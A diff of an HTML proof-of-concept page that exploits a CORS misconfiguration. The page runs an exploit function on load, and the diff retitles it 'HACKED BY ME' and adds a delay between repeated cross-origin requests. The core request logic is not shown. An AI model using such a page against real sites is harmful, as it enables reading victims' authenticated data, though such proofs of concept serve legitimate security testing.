@@ -1,11 +1,10 @@
-```html
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS</title>
+    <title>HACKED BY ME</title>
 </head>
 <body onload="exploitCORS()">
-    <h1>CROSS-ORIGIN-RESOUCE-SHARING-POC</h1>
+    <h1>CORS-MISCONFIG</h1>
     <div id="result">Exploit starting...</div>
 
     <script>
@@ -89,11 +88,13 @@
                     }
                 } catch (error) {
                     // Continue trying on error
-                    resultDiv.innerHTML = 'Requesting...';
+                    resultDiv.innerHTML = 'Trying...';
                 }
+                
+                // Wait 0.2 seconds before next request
+                await new Promise(resolve => setTimeout(resolve, 200));
             }
         }
     </script>
 </body>
 </html>
-```
